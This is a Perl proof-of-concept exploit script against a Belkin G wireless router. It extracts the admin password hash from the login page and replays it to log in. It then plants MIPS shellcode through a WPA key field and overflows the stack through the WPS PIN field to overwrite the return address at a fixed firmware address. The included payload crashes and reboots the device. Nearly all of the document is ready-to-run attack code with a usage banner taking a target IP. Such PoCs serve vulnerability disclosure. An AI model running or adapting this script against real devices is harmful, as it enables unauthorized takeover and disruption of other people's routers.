#!/usr/bin/perl
 
use strict;
use warnings;
use LWP 5.64;
$| = 1;
 
# Variable declarations.
my $browser = LWP::UserAgent->new;
my $passHash="";
my $url ="";
my $response ="";
my $ip="";
$browser ->timeout(10);
 
 
# Just a few nops followed by a dummy shellcode that crashes & reboots the router.
my $shellcode="\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x04\xd0\xff\xff\x20\x20\x20\x20";
 
 
 
sub Authenticate()
{
  print "[+] Trying to authenticate.\n";
  $url= "http://$ip/login.stm";
  $response = $browser->get( $url);
  my @aod= $response->content =~ m/var password = "(.*)";/g;
  if(!$aod[0])
  {
     print "[-] Damn! Something went wrong. This might not work here :-/\n";
     exit;
  }
  else
  {
     $passHash=$aod[0];
     print "[+] Admin Password = $passHash (MD5 Hash).\n";
  }
 
 print "[+] Time to authenticate you!\n";
 $url = "http://$ip/cgi-bin/login.exe";
 $response = $browser->post( $url,
    [ 'totalMSec' => "1377121454.99", 
      'pws' => "$passHash",
    ,]
  );
   
  if( $response->content =~ /index/ )
  {
    print "[+] Logged in successfully as 'Admin'!\n";
    print "[!] Open this link in a browser for admin access : http://$ip/setup.htm \n";
  } else {
    print "[-] Login failed! This might not work here :-/\n";
    exit;
  }
 
  print "\n[+] Continue with exploitation? (Y/N) : ";
  my $temp=<STDIN>;
  if ($temp=~"Y" || $temp=~"y")
  {
    Exploit();
  }
  else
  {
    print "[+] Have fun!\n\n";
    exit;
  }
}
 
 
sub Exploit()
{
# Stage 1: Fill shellcode at a known location : 0x803c0278 (Buffer=120 bytes)
# 0x803c0278 is fixed for this device/firmware combination.
  print "[+] Stage 1 : Allocating shellcode.\n";
 
  if (length($shellcode) > 120)
  {
   print "[-] Shellcode is too big! (120 bytes Max)\n";
   exit;
  }
  print "[+] Shellcode length : ".length($shellcode)."\n";
 
  # Fill the rest with nops. Not needed but good to have.
  # Shellcode size should be ideally a multiple of 4 as this is MIPS.
  my $nopsize=120-length($shellcode);
  $shellcode=$shellcode.("\x20"x$nopsize);
 
 $url = "http://$ip/cgi-bin/wireless_WPA.exe";
 $response = $browser->post( $url,
    [ 'wpa_authen' => "1", 
      'wpa_psk' => '0',
      's_rekeysec' => '900000',
      's_rekeypkt' => '1000',
      'w802_rekey' => '0',
      'encryption' => '3',
      'security_type' => '4',
      'authentication' => '3',
      'encryption_hid' => '3',
      'wpa_key_text' => "ssss",
      'wpa_key_pass' => "$shellcode",
      'obscure_psk' => '1',
      'sharedkey_alter' => '',
      'sharedkey_alter1' => '1',
       
    ,]
  );
  
  if( !$response->content )
  {
     print "[-] Damn! Something went wrong. This might not work here :-/\n"; 
  }
  else
  {  
    print "[+] Stage 1 seems to have gone well.\n";
  }
 
# Stage 2: Trigger Stack Overflow & overwrite RA
print "[+] Stage 2 : Triggering Return Address overwrite.\n";
 
my $junk="A"x32;
my $s0="BBBB";
my $s1="CCCC";
my $ra="\x78\x02\x3c\x80"; #EPC   -> 0x803c0278 Fixed for this device/firmware combination.
my $nop="\x20\x20\x20\x20";
my $payload=$junk.$s0.$s1.$ra.$nop;
 
 $url = "http://$ip/cgi-bin/wireless_WPS_Enroll.exe";
 $response = $browser->post( $url,[ 'pin' => "$payload"]);
 if( !$response->content )
  {
    print "[-] Damn! Something went wrong. This might not work here :-/\n"; 
  }
 else
 {
    print "[-] Done! \\m/\n";
 }
 
}
 
sub Welcome()
{
  print "\n\n+------------------------------------------+\n";
  print "|  Belkin G Wireless Router Remote Exploit |\n";
  print "|     (Authentication bypass & RCE PoC)    |\n";
  print "+------------------------------------------+\n";
  print "[+] By Aodrulez.\n";
  print "\n[+] Usage   : perl $0 router_ip";
  print "\n[!] Example : perl $0 X.X.X.X";
 
  if (!$ARGV[0])
  {
    print "\n[-] (o_0) Seriously??\n";
    exit;
  }
 
  $ip=$ARGV[0];
  print "\n[+] Target IP : $ip\n";
 
}
 
# Burn!!
Welcome();
Authenticate();
# End of exploit code.


